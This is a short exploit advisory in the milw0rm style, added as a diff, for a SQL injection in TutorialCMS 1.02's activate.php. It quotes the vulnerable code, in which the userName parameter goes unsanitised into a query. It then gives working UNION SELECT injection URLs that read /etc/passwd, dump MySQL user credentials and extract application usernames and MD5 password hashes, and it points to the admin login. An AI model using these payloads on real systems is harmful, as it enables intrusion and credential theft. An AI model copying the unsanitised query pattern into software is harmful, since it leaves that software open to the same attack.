@@ -1,0 +1,37 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+ TutorialCMS 1.02 Remote SQL Injection Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+bug found by ka0x
+contact: ka0x01[at]gmail.com
+D.O.M TEAM 2008
+we are: ka0x, an0de, xarnuz
+#from spain
+
+download http://www.wavelinkmedia.com/scripts/tutorialcms/
+
+need magic_quotes_gpc = off
+
+vulnerability in activate.php
+
+vuln code:
+[...]
+
+$userName = $_GET["userName"];
+$code     = $_GET["activate"];
+$sql = "SELECT activated FROM users WHERE username = '$userName' AND activated = '$code'";
+
+[...]
+
+/etc/password:
+http://[host]/activate.php?userName='/**/union/**/select/**/1,2,3,4,load_file(0x2f6574632f706173737764),6,7,8,9,9,9,9,9/*
+
+User and Password from mysql.user:
+http://[host]/activate.php?userName='/**/union/**/select/**/1,2,3,4,concat(user,0x203a3a20,password),6,7,8,9,9,9,9,9/**/from/**/mysql.user/*
+
+POC: http://[host]/activate.php?userName='/**/union/**/select/**/1,2,3,4,concat(0x757365723a20,username,0x20706173733a20,password),6,7,8,9,9,9,9,9/**/from/**/users/*
+
+The encription of password is MD5
+login: http://[host]/admin
+
+# milw0rm.com [2008-01-12]
